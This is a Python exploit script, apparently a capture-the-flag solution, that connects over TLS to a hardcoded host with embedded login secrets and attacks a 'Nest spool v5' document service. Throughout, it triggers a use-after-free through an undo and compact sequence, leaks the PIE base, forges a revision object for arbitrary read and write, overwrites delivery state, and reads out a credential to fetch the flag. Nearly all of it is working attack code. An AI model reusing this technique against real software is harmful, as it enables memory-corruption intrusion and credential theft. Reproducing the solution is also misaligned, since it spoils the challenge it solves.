import socket
import ssl
import struct


HOST = "65.21.179.193"
PORT = 9305
SERVER_NAME = "ctf.roshancodes.com"
AUTH = (
    "rupesh:24615f5322b2e341debc09aa9bdf3a15:"
    "79e04d840caa48436b132e3801df168532cfaa797bdd3857cdc0a3ef7cbb4ed8\n"
).encode()


def recv_exact(sock, size):
    result = bytearray()
    while len(result) < size:
        chunk = sock.recv(size - len(result))
        if not chunk:
            raise EOFError("worker closed the connection")
        result += chunk
    return bytes(result)


def recv_line(sock):
    result = bytearray()
    while not result.endswith(b"\n"):
        result += recv_exact(sock, 1)
    return bytes(result)


def command(sock, op, doc=0, arg=0, body=b"", framed=False):
    sock.sendall(struct.pack("<BBH", op, doc, arg) + body)
    if framed:
        length = struct.unpack("<H", recv_exact(sock, 2))[0]
        return recv_exact(sock, length)
    return recv_line(sock)


def expect(sock, expected, *args, **kwargs):
    response = command(sock, *args, **kwargs)
    if response != expected:
        raise RuntimeError(f"expected {expected!r}, received {response!r}")


def fake_document(target):
    # The dangling revision object lies 0x20 bytes into this replacement
    # allocation. Its first field is the buffer pointer used by render/patch.
    return b"C" * 0x20 + struct.pack("<Q", target) + b"D" * 0x18


def main():
    context = ssl.create_default_context()
    with socket.create_connection((HOST, PORT), timeout=10) as raw:
        with context.wrap_socket(raw, server_hostname=SERVER_NAME) as sock:
            sock.settimeout(10)
            sock.sendall(AUTH)
            banner = recv_line(sock)
            if banner != b"Nest spool v5\n":
                raise RuntimeError(f"unexpected banner: {banner!r}")

            # Build current R1 plus saved R0, queue R1, then change its revision
            # ID with undo. Compact mistakes R1 for an unqueued saved revision
            # and frees it while job 0 still contains its raw pointer.
            expect(sock, b"created\n", 1, 0, 32, b"A" * 32)
            expect(sock, b"saved\n", 2, 0)
            expect(sock, b"replaced\n", 3, 0, 32, b"B" * 32)
            expect(sock, b"queued\n", 5, 0, 0)
            expect(sock, b"undone\n", 4, 0)
            expect(sock, b"compacted\n", 6, 0)

            # The stale render follows the coalesced free-list pointer. Its
            # owner field is a PIE address: image_base + 0x4a80.
            freelist = command(sock, 7, 0, 0, framed=True)
            arena_global = struct.unpack_from("<Q", freelist, 8)[0]
            image_base = arena_global - 0x4A80
            if image_base & 0xFFF:
                raise RuntimeError(f"bad PIE base leak: 0x{image_base:x}")
            print(f"PIE base: 0x{image_base:x}")

            state = image_base + 0x4A50
            credential_global = image_base + 0x4A90

            # A 64-byte allocation consumes the coalesced R1 region. Its byte
            # range overlaps the dangling revision pointer at offset 0x20.
            payload = fake_document(state)
            expect(sock, b"created\n", 1, 1, len(payload), payload)
            expect(sock, b"queued\n", 5, 1, 1)

            state_bytes = command(sock, 7, 0, 0, framed=True)
            delivery, required, receipts = struct.unpack_from("<QQQ", state_bytes)
            print(
                "delivery state: "
                f"current=0x{delivery:x} required=0x{required:x} receipts={receipts}"
            )

            # Job 0 is now an arbitrary 32-byte writer. Make completed state
            # equal the randomized required state while preserving neighbors.
            completed = bytearray(state_bytes)
            struct.pack_into("<Q", completed, 0, required)
            expect(sock, b"patched\n", 8, 0, 0, bytes(completed))

            # Job 1 rewrites the overlapping fake revision object, allowing
            # job 0's arbitrary-read target to be changed safely.
            payload = fake_document(credential_global)
            expect(sock, b"patched\n", 8, 1, 1, payload)
            globals_bytes = command(sock, 7, 0, 0, framed=True)
            credential_pointer = struct.unpack_from("<Q", globals_bytes)[0]
            print(f"credential buffer: 0x{credential_pointer:x}")

            payload = fake_document(credential_pointer)
            expect(sock, b"patched\n", 8, 1, 1, payload)
            credential = command(sock, 7, 0, 0, framed=True)
            print(f"credential: {credential.hex()}")

            # Receipt checks both the 32-byte credential and the completed
            # delivery-state equality, then returns the protected response.
            flag = command(sock, 9, 0, 32, credential)
            print(flag.decode(errors="replace").rstrip())


if __name__ == "__main__":
    main()
